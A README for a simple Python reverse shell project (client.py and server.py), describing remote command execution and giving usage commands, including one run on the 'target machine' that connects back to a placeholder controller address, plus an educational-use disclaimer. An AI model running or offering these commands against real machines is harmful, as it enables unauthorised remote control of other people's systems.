# Python Reverse Shell

This project consists of a simple Python reverse shell implementation. It allows a controlling machine to execute commands on a target machine by establishing a connection over the network.

## Features

- Command execution on the target machine.
- Directory navigation support.
- Simple command input and output display.

## Files

- `client.py`: The reverse shell that runs on the target machine.
- `server.py`: The listening server that runs on the controlling machine.

## Requirements

- Python 3.x installed on both machines.
- No external libraries are required.

## Usage

### Setting Up the Listener (server.py)

1. Open a terminal on the controlling machine.
2. Run the server script:

   ```bash
   python server.py --port 9999
   ```

### Running the Reverse Shell (`client.py`)

1. Open a terminal on the target machine (the machine you want to control).
2. Run the client script, replacing `YOUR_IP_ADDRESS` with the IP address of the controlling machine:

   ```bash
   python client.py --server-ip YOUR_IP_ADDRESS --port 9999
   ```
   
### Controlling the Target Machine

- Once the connection is established, you can enter commands in the `server.py` terminal, and the output will be displayed in real-time.
- To exit the reverse shell, type `exit` in the server terminal.

## Important Notes

- **Legal and Ethical Use**: Ensure you have explicit permission to access and control the target machine. Unauthorized access is illegal and unethical.
- **Same Network**: Both machines should be on the same local network for successful communication.
- **Firewall Settings**: Check the firewall settings if you encounter any connection issues.

## Disclaimer

This code is intended for educational purposes only. Use it responsibly and in compliance with all applicable laws and regulations.
